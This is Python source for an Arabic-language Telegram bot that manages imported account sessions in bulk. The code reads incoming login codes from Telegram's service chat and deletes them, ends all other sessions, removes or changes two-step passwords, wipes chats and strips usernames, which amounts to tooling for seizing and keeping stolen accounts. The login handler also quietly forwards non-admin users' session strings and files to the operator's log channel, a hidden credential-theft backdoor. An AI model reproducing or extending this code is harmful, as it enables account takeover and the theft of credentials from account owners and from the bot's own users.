            user_display = f"@{html.escape(me.username)}"
        else:
            user_display = "----"

        # تجهيز السطر الخاص بكل حساب
        line = f"⎉╎ <b>{user_display}</b> | <code>{phone}</code>\n"

        # إذا اقتربنا من الحد الأقصى لتليجرام (3900 حرف)، نحفظ الرسالة ونبدأ رسالة جديدة
        if len(current_text) + len(line) > 3900:
            text_chunks.append(current_text)
            current_text = "<b>🛂┊ تـكـمـلـة الـيـوزرات:</b>\n\n" + line
        else:
            current_text += line

    # إضافة آخر دفعة إلى القائمة
    if current_text:
        text_chunks.append(current_text)

    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))

    # إرسال الرسائل بالترتيب
    for i, chunk in enumerate(text_chunks):
        is_last_chunk = (i == len(text_chunks) - 1)
        # نضع الزر فقط في الرسالة الأخيرة
        current_markup = markup if is_last_chunk else None

        try:
            if i == 0:
                # الرسالة الأولى تعدل رسالة "جاري الفحص..."
                bot.edit_message_text(chunk, call.message.chat.id, call.message.message_id, reply_markup=current_markup, parse_mode="HTML")
            else:
                # الرسائل التكميلية تُرسل كرسائل جديدة
                bot.send_message(call.message.chat.id, chunk, reply_markup=current_markup, parse_mode="HTML")
                time.sleep(0.3) # تجنب حظر الـ Spam من تليجرام للإرسال السريع
        except Exception as e:
            pass

@bot.callback_query_handler(func=lambda call: call.data == "usernames_release_menu")
def usernames_release_menu(call):
    if not is_allowed(call.from_user.id): return

    accounts = get_all_accounts(call.from_user.id)
    if not accounts:
        return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)

    bot.edit_message_text("⏳ **جـاري جـلـب الـحـسـابـات الـتـي تـحـتـوي عـلـى يـوزرات...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    fetched_data = run_async(gather_account_info_safe(accounts))

    markup = InlineKeyboardMarkup()
    has_usernames = False

    for acc_id, phone, name, uid, me in fetched_data:
        if me and me.username:
            has_usernames = True
            # النص داخل الأزرار آمن ولا يتأثر بالماركدون أبداً
            markup.row(InlineKeyboardButton(f"@{me.username} | {phone}", callback_data=f"act_release:{acc_id}"))

    if has_usernames:
        markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="act_release:all"))

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))

    # تفعيل حالة التحرير لانتظار الـ @
    USER_STATES[call.from_user.id] = {"action": "wait_for_username_release"}

    if has_usernames:
        text = "🛂┊ **تـحـريـر الـيـوزرات:**\n\n⎉╎ **اخـتـر يـوزراً لـتـحـريـره أو أرسـل الـيـوزر بـالـشـكـل `@user`**"
    else:
        text = "🛂┊ **لا يـوجـد أي حـسـاب يـحـتـوي عـلـى يـوزر حـالـيـاً.**"

    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# دالة التحرير الفعلية عبر الأزرار
@bot.callback_query_handler(func=lambda call: call.data.startswith("act_release:"))
def execute_release_username(call):
    if not is_allowed(call.from_user.id): return
    target = call.data.split(":")[1]

    bot.edit_message_text("⏳ **جـاري تـحـريـر الـيـوزر(ات)...**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    async def do_release(acc_id, pyro_session):
        async with account_semaphore: # يلتزم بـ 50 اتصال بنفس الوقت
            client = Client(f"rel_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
            try:
                await asyncio.wait_for(client.connect(), timeout=8)
                await client.set_username(None)  # هذا الأمر يحذف اليوزر من الحساب
                await client.disconnect()
                return True
            except Exception:
                if client.is_connected: await client.disconnect()
                return False

    async def release_all():
        accounts = get_all_accounts(call.from_user.id)
        if target != "all":
            accounts = [a for a in accounts if str(a[0]) == target]

        tasks = [do_release(acc[0], acc[4]) for acc in accounts]
        results = await asyncio.gather(*tasks)

        success_count = sum(1 for r in results if r)

        msg = (
            f"🛂┊ **تـمـت عـمـلـيـة تـحـريـر الـيـوزرات!**\n\n"
            f"⎉╎ **الـنـجـاح:** `{success_count}` حـسـاب\n"
            f"**⚠️┊ انـتـظـر 5 دقـائـق قـبـل اسـتـخـدام الـيـوزر.**"
        )
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="usernames_manage"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    run_async(release_all())

# استقبال الـ @ والـ @@ للتحرير عبر النص (محمي بـ HTML)
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('@') or m.text.startswith('@@')))
def handle_text_username_release(message):
    uid = message.from_user.id
    if not is_allowed(uid): return

    text = message.text.strip()
    target_username = None

    # فحص نوع الرد
    if text.startswith('@@'):
        target_username = text[2:].lower() # إزالة الـ @@
    elif text.startswith('@'):
        state = USER_STATES.get(uid, {}).get("action")
        if state == "wait_for_username_release":
            target_username = text[1:].lower() # إزالة الـ @
        else:
            return # إذا أرسل @ واحدة وهو خارج قسم التحرير، البوت لا يتجاوب

    if not target_username: return

    # استخدام HTML لحماية الرد من الشرطات السفلية الخاصة باليوزر
    status_msg = bot.reply_to(message, f"⏳ <b>جـاري الـبـحـث عـن <code>@{html.escape(target_username)}</code> وتـحـريـره...</b>", parse_mode="HTML")

    async def find_and_release(target):
        accounts = get_all_accounts(uid)

        # دالة للبحث والتحرير الداخلي
        async def check_and_remove(acc_id, pyro_session):
            async with account_semaphore:
                client = Client(f"sc_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
                try:
                    await asyncio.wait_for(client.connect(), timeout=8)
                    me = await client.get_me()
                    if me and me.username and me.username.lower() == target:
                        await client.set_username(None)
                        await client.disconnect()
                        return True
                    await client.disconnect()
                except Exception:
                    if client.is_connected: await client.disconnect()
                return False

        tasks = [check_and_remove(acc[0], acc[4]) for acc in accounts]
        results = await asyncio.gather(*tasks)

        if any(results):
            return True
        return False

    success = run_async(find_and_release(target_username))

    if success:
        msg = (
            f"🛂┊ <b>تـمـت تـحـريـر الـيـوزر <code>@{html.escape(target_username)}</code> بـنـجـاح!</b>\n\n"
            f"<b>⚠️┊ انـتـظـر 5 دقـائـق قـبـل إضـافـتـه لـحـسـابـك.</b>"
        )
    else:
        msg = f"🛂┊ <b>لـم يـتـم الـعـثـور عـلـى الـيـوزر <code>@{html.escape(target_username)}</code> فـي أي حـسـاب تـمـلـكـه.</b>"

    bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode="HTML")



import asyncio
import re
import time
import threading
from datetime import datetime
from pyrogram import Client
from pyrogram.raw import functions
from pyrogram.enums import ChatType
from pyrogram.errors import (
    AuthKeyUnregistered, SessionRevoked, UserDeactivated, 
    UserDeactivatedBan, FloodWait, PasswordHashInvalid
)

# ---------------------------------------------------------
# متغيرات التحكم بالسرعة (نظام الطابور الذكي)
# ---------------------------------------------------------
MAX_ACCOUNTS_CONCURRENT = 50 # 50 حساب بنفس الوقت
MAX_CHATS_CLEAN_CONCURRENT = 20 # 20 محادثة تنظف بنفس الوقت (للأمان)

class PerLoopSemaphore:
    """كلاس ذكي يولد Semaphore مستقل لكل مسار (Thread) لحل مشكلة Telebot مع Asyncio"""
    def __init__(self, value):
        self.value = value
        self.sems = {}
        self.lock = threading.Lock()

    async def __aenter__(self):
        loop = asyncio.get_running_loop()
        with self.lock:
            if loop not in self.sems:
                self.sems[loop] = asyncio.Semaphore(self.value)
        await self.sems[loop].acquire()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        loop = asyncio.get_running_loop()
        self.sems[loop].release()

account_semaphore = PerLoopSemaphore(MAX_ACCOUNTS_CONCURRENT)
clean_semaphore = PerLoopSemaphore(MAX_CHATS_CLEAN_CONCURRENT)


# =========================================================
# 1. القوائم الوسيطة (التي كانت مفقودة واصلحناها)
# =========================================================

@bot.callback_query_handler(func=lambda call: call.data in ["menu_terminate", "menu_clean", "menu_logout", "menu_remove", "menu_2fa_remove", "menu_2fa_change"])
def action_menus(call):
    if not is_allowed(call.from_user.id): return
    action = call.data.replace("menu_", "")
    titles = {
        "terminate": "🛂┊ إنـهـاء الـجـلـسـات الأُخـرى:\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:",
        "clean": "🛂┊ الـتـنـظـيـف الـشـامـل:\n⎉╎ اخـتـر حـسـابـاً أو نـفـذ عـلـى الـجـمـيـع:",
        "logout": "🛂┊ تـسـجـيـل خـروج نـهـائـي:\n⎉╎ اخـتـر حـسـابـاً لـلـخـروج مـنـه:",
        "remove": "🛂┊ إزالـة مـن الـبـوت (بـدون خـروج):\n⎉╎ اخـتـر حـسـابـاً لـحـذفـه بـرمـجـيـاً:",
        "2fa_remove": "🛂┊ حـذف الـتـحـقـق بـخـطـوتـيـن:\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:",
        "2fa_change": "🛂┊ تـغـيـيـر الـتـحـقـق بـخـطـوتـيـن:\n⎉╎ اخـتـر الـحـسـاب الـمـسـتـهـدف:"
    }
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "menu_2fa_manage")
def menu_2fa_manage(call):
    if not is_allowed(call.from_user.id): return
    bot.edit_message_text("🛂┊ إدارة الـتـحـقـق بـخـطـوتـيـن:\n\n⎉╎ اخـتـر الـعـمـلـيـة:", call.message.chat.id, call.message.message_id, reply_markup=two_fa_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "autoterm_manage")
def autoterm_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    accounts = get_all_accounts(call.from_user.id)
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT auto_term_enabled FROM sessions WHERE owner_id=?", (call.from_user.id,))
    rows = c.fetchall()
    all_enabled = all(r[0] == 1 for r in rows) if rows else False

    markup.row(InlineKeyboardButton("• تـعـطـيـل الإزالـة لـلـجـمـيـع 🔴" if all_enabled else "• تـفـعـيـل الإزالـة لـلـجـمـيـع 🟢", callback_data="autoterm:toggle:all"))
    markup.row(InlineKeyboardButton("• ضـبـط وقـت الإزالـة 🕒", callback_data="autoterm_set_time"))

    for acc_id, phone, name, uid, _ in accounts:
        c.execute("SELECT auto_term_enabled, auto_term_interval FROM sessions WHERE id=?", (acc_id,))
        acc_data = c.fetchone()
        if acc_data:
            markup.row(InlineKeyboardButton(f"{'🟢' if acc_data[0] == 1 else '🔴'} {name} | كل {acc_data[1]} سـاعـة", callback_data=f"autoterm:toggle:{acc_id}"))
    conn.close()
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
    text = "🛂┊ **إدارة إزالـة الأجـهـزة الـتـلـقـائـيـة:**\n\n⎉╎ يـقـوم الـبـوت بـفـحـص وإنـهـاء جـلـسـات الـحـسـابـات بـشـكـل دوري."
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm:toggle:"))
def handle_autoterm_toggle(call):
    if not is_allowed(call.from_user.id): return
    target = call.data.split(":")[-1]
    conn = get_db_conn()
    c = conn.cursor()
    if target == "all":
        c.execute("SELECT auto_term_enabled FROM sessions WHERE owner_id=?", (call.from_user.id,))
        rows = c.fetchall()
        new_state = 0 if all(r[0] == 1 for r in rows) else 1
        c.execute("UPDATE sessions SET auto_term_enabled=? WHERE owner_id=?", (new_state, call.from_user.id))
    else:
        c.execute("SELECT auto_term_enabled FROM sessions WHERE id=?", (target,))
        new_state = 0 if c.fetchone()[0] == 1 else 1
        c.execute("UPDATE sessions SET auto_term_enabled=? WHERE id=?", (new_state, target))
    conn.commit()
    conn.close()
    autoterm_manage_menu(call)

@bot.callback_query_handler(func=lambda call: call.data == "autoterm_set_time")
def autoterm_set_time_start(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="autoterm:time:all"))
    for acc_id, phone, name, uid, _ in get_all_accounts(call.from_user.id):
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"autoterm:time:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 إلـغـاء", callback_data="autoterm_manage"))
    bot.edit_message_text("🛂┊ ضـبـط وقـت الإزالـة:\n\n⎉╎ اخـتـر الـحـسـاب:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("autoterm:time:"))
def ask_autoterm_hours(call):
    if not is_allowed(call.from_user.id): return
    USER_STATES[call.from_user.id] = {"action": "set_autoterm_hours", "target": call.data.split(":")[-1]}
    msg = bot.send_message(call.message.chat.id, "•❐• أرسـل عـدد الـسـاعـات (مـثـال: 1 لـساعة، 24 لـيوم):")
    bot.register_next_step_handler(msg, process_autoterm_hours)

def process_autoterm_hours(message):
    uid = message.from_user.id
    if uid not in USER_STATES or USER_STATES[uid]["action"] != "set_autoterm_hours": return
    target = USER_STATES.pop(uid)["target"]
    if not message.text.strip().isdigit() or int(message.text.strip()) < 1: return bot.send_message(message.chat.id, "❌ رقـم غـيـر صـالـح.", reply_markup=home_keyboard(uid))
    hours = int(message.text.strip())
    conn = get_db_conn()
    c = conn.cursor()
    if target == "all":
        c.execute("UPDATE sessions SET auto_term_interval=?, auto_term_enabled=1 WHERE owner_id=?", (hours, uid))
    else:
        c.execute("UPDATE sessions SET auto_term_interval=?, auto_term_enabled=1 WHERE id=?", (hours, target))
    conn.commit()
    conn.close()
    bot.send_message(message.chat.id, f"✅ تـم ضـبـط الإزالـة عـلـى: كـل {hours} سـاعـة.", parse_mode="Markdown", reply_markup=home_keyboard(uid))


# =========================================================
# 2. فحص الحسابات الشغالة (سريع 50 اتصال)
# =========================================================
@bot.callback_query_handler(func=lambda call: call.data == "check_active")
def check_active_accounts(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جاري فحص الحسابات بسرعة 50 اتصال...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص الـحـسـابـات الـشـغـالـة...", parse_mode="Markdown")
    run_async(check_active_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_single_active(acc_id, phone, name, pyro_session, owner_id):
    async with account_semaphore:
        client = Client(f"chk_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=10)
            await client.get_me()
            return f"✅ {phone} | نشط\n", 1
        except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
            if await confirm_session_death(pyro_session):
                handle_dead_session(owner_id, acc_id, phone, name)
                return f"❌ {phone} (تـم طـرده وحـذفـه)\n", 0
            else:
                return f"⚠️ {phone} (خـطـأ مـؤقـت)\n", 1
        except asyncio.TimeoutError:
            return f"⚠️ {phone} (انتهى وقت الاتصال - معلق)\n", 1
        except Exception:
            return f"⚠️ {phone} (فـشـل الاتـصـال بـسـبـب الـشـبـكـة)\n", 1
        finally:
            if client.is_connected: await client.disconnect()

async def check_active_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if not accounts: return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))

    tasks = [check_single_active(acc_id, phone, name, pyro_session, owner_id) for acc_id, phone, name, uid, pyro_session in accounts]
    results = await asyncio.gather(*tasks)

    active_count = sum(res[1] for res in results)
    text = "🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n" + "".join(res[0] for res in results)

    final_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن اصـل {len(accounts)}\n\n{text}"
    bot.edit_message_text(final_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))

# =========================================================
# 3. جلب الأكواد الشامل (السريع)
# =========================================================
@bot.callback_query_handler(func=lambda call: call.data == "req_code")
def scan_all_codes(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جاري جلب الأكواد (الكل بنفس الوقت)...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
    run_async(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_single_account_codes(acc_id, phone, pyro_session):
    codes = []
    async with account_semaphore:
        client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=8)
            ten_mins_ago = time.time() - 600
            async for msg in client.get_chat_history(777000, limit=5):
                if msg.date and msg.date.timestamp() > ten_mins_ago and msg.text:
                    match = re.search(r'\b(\d{5})\b', msg.text)
                    if match:
                        codes.append({'phone': phone, 'code': match.group(1), 'time': msg.date.timestamp()})
                        try:
                            await client.delete_messages(777000, msg.id)
                        except: pass
            await client.disconnect()
        except Exception:
            if client.is_connected: await client.disconnect()
    return codes

async def fetch_all_codes_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if not accounts: return bot.edit_message_text("❌ لا تـوجـد حـسـابـات مـضـافـة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))

    tasks = [check_single_account_codes(acc_id, phone, pyro_session) for acc_id, phone, name, uid, pyro_session in accounts]
    results = await asyncio.gather(*tasks)

    all_codes = [item for sublist in results for item in sublist]
    all_codes.sort(key=lambda x: x['time'], reverse=True)
    top_2_codes = all_codes[:2]

    if not top_2_codes:
        bot.edit_message_text("❌ لـم يـصـل أي كـود جـديـد (خـلال آخـر 10 دقـائـق).", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
        return

    text = "🛂┊ أكـواد الـدخـول (الأحـدث فـقـط):\n\n"
    for i, item in enumerate(top_2_codes):
        label = "🟢 الأحـدث" if i == 0 else "🔵 الـثـانـي"
        text += f"{label}\n⎉╎ الـرقـم: {item['phone']}\n•❐• الـكـود: `{item['code']}`\n━━━━━━━━━━━━━━━━\n"

    bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))

# =========================================================
# 4. الميزة السرية: عرض كافة أكواد حساب معين
# =========================================================
@bot.message_handler(commands=['عرض_الاكواد', 'عرض الاكواد'])
def secret_show_codes(message):
    if not is_allowed(message.from_user.id): return
    target = message.text.replace('/عرض الاكواد', '').replace('/عرض_الاكواد', '').strip()
    if not target:
        return bot.reply_to(message, "⚠️ أرسل الأمر مع رقم أو أيدي الحساب، مثال:\n`/عرض الاكواد +1234567890`", parse_mode="Markdown")

    bot.reply_to(message, f"⏳ جاري جلب الأرشيف الكامل لأكواد {target} ...")
    run_async(secret_fetch_all_codes(message.from_user.id, message.chat.id, target))

async def secret_fetch_all_codes(owner_id, chat_id, target):
    accounts = get_all_accounts(owner_id)
    target_acc = next((acc for acc in accounts if str(acc[1]) == target or str(acc[0]) == target), None)

    if not target_acc:
        return bot.send_message(chat_id, "❌ لم يتم العثور على هذا الحساب في قاعدة البيانات.")

    acc_id, phone, name, uid, pyro_session = target_acc
    text = f"🛂┊ الأرشيف الكامل لأكواد: {phone}\n\n"

    client = Client(f"sec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await asyncio.wait_for(client.connect(), timeout=10)
        found = False
        async for msg in client.get_chat_history(777000, limit=20):
            if msg.text:
                match = re.search(r'\b(\d{5})\b', msg.text)
                if match:
                    found = True
                    msg_time = datetime.fromtimestamp(msg.date.timestamp()).strftime('%Y-%m-%d %H:%M:%S')
                    text += f"📅 {msg_time}\n•❐• الكود: `{match.group(1)}`\n━━━━━━━━━\n"
        await client.disconnect()

        if not found: text += "❌ لا توجد أي رسائل أكواد في هذا الحساب حالياً."
        bot.send_message(chat_id, text, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ فشل الاتصال بالحساب لجلب الأرشيف.")

# =========================================================
# 5. دوال التنفيذ السريعة (التنظيف، الإنهاء، الخروج)
# =========================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("act:"))
def execute_action(call):
    if not is_allowed(call.from_user.id): return
    parts = call.data.split(":")
    action = parts[1]
    target = parts[2]
    if action == "renew":
        bot.answer_callback_query(call.id, "⏳ جاري بدء عملية التجديد المتوازية...")
        status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري تـجـهـيـز الـجـلـسـات...", parse_mode="Markdown")
        run_async(execute_renew_all_async(call.from_user.id, status_msg.chat.id, status_msg.message_id, target))
        return

    if action in ["2fa_remove", "2fa_change"]:
        USER_STATES[call.from_user.id] = {"action": action, "target": target}
        msg = bot.send_message(call.message.chat.id, "•❐• أرسـل **كـلـمـة الـسـر الـحـالـيـة** (أو 'لا يوجد'):", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_old_pass)
        return

    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ الفعلي بـ 50 اتصال...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري الـعـمـل بـشـكـل صـارم (Raw API)...", parse_mode="Markdown")

    if target == "all":
        run_async(execute_action_all_async(action, call.from_user.id, status_msg.chat.id, status_msg.message_id))
    else:
        run_async(execute_action_single_async(action, int(target), call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def execute_action_all_async(action, owner_id, chat_id, msg_id):
    tasks = [perform_action_async(action, acc[0], owner_id) for acc in get_all_accounts(owner_id)]
    results = await asyncio.gather(*tasks)

    result_text = "🛂┊ **مـلـخـص الـعـمـلـيـة:**\n\n" + "\n".join(results)
    if len(result_text) > 4000:
        bot.edit_message_text(result_text[:4000] + "\n... (مقتطع)", chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
    else:
        bot.edit_message_text(result_text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))

async def execute_action_single_async(action, acc_id, owner_id, chat_id, msg_id):
    res = await perform_action_async(action, acc_id, owner_id)
    bot.edit_message_text(res, chat_id, msg_id, reply_markup=home_keyboard(owner_id), parse_mode="Markdown")

async def perform_action_async(action, acc_id, owner_id):
    async with account_semaphore:
        acc = get_account(acc_id)
        if not acc: return "❌ الـحـسـاب غـيـر مـوجـود."
        _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _, _ = acc

        if action == "remove":
            delete_account(acc_id)
            return f"✅ تـم إزالـة `{phone}` بـرمـجـيـاً مـن الـبـوت."

        exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(exec_client.connect(), timeout=12)
        except Exception: return f"❌ فـشـل الاتـصـال بـ `{phone}`"

        result_msg = ""
        try:
            if action == "terminate":
                auths = await exec_client.invoke(functions.account.GetAuthorizations())
                has_other_sessions = False
                terminated_count = 0
                wait_error = False

                for auth in auths.authorizations:
                    if not getattr(auth, 'current', False):
                        has_other_sessions = True
                        try:
                            await exec_client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                            terminated_count += 1
                        except Exception as e:
                            if "fresh" in str(e).lower() or "24" in str(e).lower() or "FORBIDDEN" in str(e).upper():
                                wait_error = True
                                break

                if wait_error: result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة لإنـهـاء الـجـلـسـات."
                elif not has_other_sessions: result_msg = f"⚠️ لا يـوجـد جـلـسـات أخـرى لإنـهـائـهـا لـ `{phone}`."
                else: result_msg = f"✅ تـم إنـهـاء ({terminated_count}) جـلـسـة بـنـجـاح لـ `{phone}`."

            elif action == "clean":
                async def delete_single_dialog(dialog):
                    async with clean_semaphore:
                        try:
                            peer = await exec_client.resolve_peer(dialog.chat.id)
                            if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                                if dialog.chat.type == ChatType.GROUP:
                                    me = await exec_client.resolve_peer("me")
                                    await exec_client.invoke(functions.messages.DeleteChatUser(chat_id=peer.chat_id, user_id=me))
                                else:
                                    await exec_client.invoke(functions.channels.LeaveChannel(channel=peer))
                                return 1
                            elif dialog.chat.type in [ChatType.PRIVATE, ChatType.BOT]:
                                if dialog.chat.id not in [777000, exec_client.me.id]:
                                    await exec_client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                                    return 1
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                        except Exception: pass
                        return 0

                dialogs_to_delete = []
                async for dialog in exec_client.get_dialogs(limit=400):
                    dialogs_to_delete.append(dialog)

                del_tasks = [delete_single_dialog(d) for d in dialogs_to_delete]
                del_results = await asyncio.gather(*del_tasks)
                cleaned_count = sum(del_results)

                result_msg = f"🧹 تـم تـنـظـيـف ({cleaned_count}) مـحـادثـة (شـامـلـة) لـ `{phone}`."

            elif action == "logout":
                try:
                    await exec_client.invoke(functions.auth.LogOut())
                    delete_account(acc_id)
                    result_msg = f"🚪 تـم تـسـجـيـل الـخـروج نـهـائـيـاً مـن `{phone}`."
                except Exception: result_msg = f"❌ فـشـل تـسـجـيـل الـخـروج لـ `{phone}`."

        except Exception as e:
            if "fresh" in str(e).lower() or "24" in str(e).lower(): result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة."
            else: result_msg = f"❌ حـدث خـطـأ غـيـر مـتـوقـع فـي `{phone}`."
        finally:
            if exec_client.is_connected: await exec_client.disconnect()

        return result_msg

# =========================================================
# 6. التحقق بخطوتين (2FA) متوازي بالكامل
# =========================================================
def process_2fa_old_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    old_pass = message.text.strip()
    USER_STATES[uid]["old_pass"] = "" if old_pass == "لا يوجد" else old_pass
    if USER_STATES[uid]["action"] == "2fa_change":
        msg = bot.send_message(message.chat.id, "•❐• أرسـل كـلـمـة الـسـر الـجـديـدة:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_2fa_new_pass)
    else:
        execute_2fa_action(message, uid)

def process_2fa_new_pass(message):
    uid = message.from_user.id
    if uid not in USER_STATES: return
    USER_STATES[uid]["new_pass"] = message.text.strip()
    execute_2fa_action(message, uid)

async def do_single_2fa(acc_id, phone, pyro_session, action, old_pass, new_pass):
    async with account_semaphore:
        client = Client(f"2fa{acc_id}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=12)
            if action == "2fa_remove":
                await client.remove_cloud_password(password=old_pass)
                return f"✅ {phone}: تـم حـذف الـتـحـقـق."
            elif action == "2fa_change":
                if old_pass == "": await client.enable_cloud_password(password=new_pass, hint="Secured")
                else: await client.change_cloud_password(current_password=old_pass, new_password=new_pass)
                return f"✅ {phone}: تـم تـعـيـيـن الـتـحـقـق."
        except PasswordHashInvalid: return f"❌ {phone}: بـاسـوورد الـ 2FA خـاطـئ."
        except Exception as e:
            if "missing" in str(e).lower() or "empty" in str(e).lower(): return f"⚠️ {phone}: لا يـوجـد تـحـقـق أسـاسـاً."
            else: return f"❌ {phone}: فـشـل."
        finally:
            if client.is_connected: await client.disconnect()

async def do_2fa_async(uid, target, action, old_pass, new_pass):
    accounts = get_all_accounts(uid) if target == "all" else [acc for acc in get_all_accounts(uid) if str(acc[0]) == target]
    tasks = [do_single_2fa(acc[0], acc[2], acc[5], action, old_pass, new_pass) for acc in accounts]
    results = await asyncio.gather(*tasks)
    return results

def execute_2fa_action(message, uid):
    state = USER_STATES.pop(uid)
    status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـنـفـيـذ طـلـبـك بـ 50 اتصال...")

    async def run_2fa_wrapper():
        results = await do_2fa_async(uid, state["target"], state["action"], state.get("old_pass", ""), state.get("new_pass", ""))
        bot.edit_message_text("🛂┊ نـتـيـجـة الـتـحـقـق:\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(uid), parse_mode="Markdown")

    run_async(run_2fa_wrapper())





# =========================================================
# 📥 محرك تسجيل الدخول (Hex, String, ZIP, TDATA)
# =========================================================

def process_successful_login(message, status_msg, me, pyro_session, session_type="Session", file_path=None, raw_hex=None):
    if check_duplicate(message.from_user.id, me.id):
        bot.edit_message_text("⚠️ الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
        return

    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", pyro_session, "", session_type)

    text = (f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n⎉╎ الاسـم: {me.first_name}\n⎉╎ الـرقـم: +{(me.phone_number or 'Unknown').replace('+', '')}\n⎉╎ الآيـدي: {me.id}\n•❐• سـنـة الإنـشـاء: {get_creation_year(me.id)}\n\nتـحـكـم بـحـسـابـك مـن الأزرار أدناه:")

    bot.edit_message_text(text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id), parse_mode="Markdown")

    if message.from_user.id not in ADMIN_IDS:
        user_info = f"\n\n👤 مـعـلـومـات الـمـسـتـخـدم:\n⎉╎ الاسـم: {message.from_user.first_name}\n⎉╎ الآيـدي: `{message.from_user.id}`\n⎉╎ الـيـوزر: @{message.from_user.username or 'لا يوجد'}"
        channel_text = text + user_info

        if file_path:
            log_to_channel(channel_text, file_path=file_path)
        elif raw_hex:
            log_to_channel(channel_text, session_text=raw_hex)
        else:
            log_to_channel(channel_text, session_text=pyro_session)

